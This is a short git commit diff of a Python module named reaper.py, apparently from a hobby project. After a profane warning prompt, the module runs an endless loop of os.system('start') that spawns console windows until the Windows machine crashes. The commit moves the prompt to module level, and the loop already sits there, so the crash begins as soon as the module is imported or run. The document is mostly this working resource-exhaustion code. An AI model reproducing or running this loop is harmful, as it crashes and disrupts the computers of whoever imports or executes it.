e9848fc4cd204ff4d075956e1d225a798d4d61f7
Stremz C# <121738120+itsstremz@users.noreply.github.com>
2023-01-02 00:31:34 +0100

    Update reaper.py

--- modules/reaper.py
+++ modules/reaper.py
@@ -1,6 +1,5 @@
 import os
 
-def main():
-   lol = input("if you don't want your pc to get fucked, close the program now since te reaper module is build to crash your pc")
+lol = input("if you don't want your pc to get fucked, close the program now since te reaper module is build to crash your pc")
 while True:
     os.system("start")
